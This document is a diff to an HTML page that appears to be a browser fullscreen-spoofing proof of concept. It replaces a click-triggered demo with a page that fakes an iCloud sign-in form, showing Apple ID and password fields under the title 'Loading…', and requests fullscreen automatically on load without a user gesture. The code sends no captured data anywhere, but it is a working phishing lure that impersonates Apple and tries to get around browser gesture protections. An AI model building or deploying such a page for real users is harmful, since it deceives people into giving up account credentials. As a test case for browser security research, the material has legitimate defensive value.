@@ -2,49 +2,49 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Fullscreen Spoof via Synthesized Click</title>
+  <title>Loading…</title>
   <style>
     body {
       margin: 0;
-      background: black;
-      color: white;
-      font-family: -apple-system;
+      background: #f2f2f2;
+    }
+    #container {
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
-      flex-direction: column;
+      font-family: -apple-system;
     }
-    #trigger {
-      padding: 16px 32px;
-      background: #0a84ff;
-      border: none;
-      border-radius: 8px;
+    input, button {
+      margin: 6px;
+      padding: 12px;
+      font-size: 16px;
+      width: 260px;
+      border-radius: 6px;
+    }
+    button {
+      background: #007aff;
       color: white;
-      font-size: 18px;
+      border: none;
     }
   </style>
 </head>
 <body>
 
-<h2>Click to Continue</h2>
-<button id="trigger">Continue</button>
+<div id="container">
+  <h2>Sign in to iCloud</h2>
+  <input placeholder="Apple ID" type="email">
+  <input placeholder="Password" type="password">
+  <button onclick="alert('Wrong password')">Continue</button>
+</div>
 
 <script>
-  const fakeClick = () => {
-    document.documentElement.requestFullscreen().then(() => {
-      document.body.innerHTML = `
-        <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:white;">
-          <h2 style="color:#000;">Sign in to iCloud</h2>
-          <input type="email" placeholder="Email" style="margin:8px;padding:12px;width:250px;">
-          <input type="password" placeholder="Password" style="margin:8px;padding:12px;width:250px;">
-          <button style="padding:12px 24px;margin-top:12px;">Login</button>
-        </div>`;
-    }).catch(e => console.log("Blocked:", e));
-  };
-
-  // Manual trigger for gesture
-  document.getElementById("trigger").onclick = fakeClick;
+window.onload = () => {
+  setTimeout(() => {
+    document.documentElement.requestFullscreen().catch(() => {});
+  }, 300);
+};
 </script>
 
 </body>
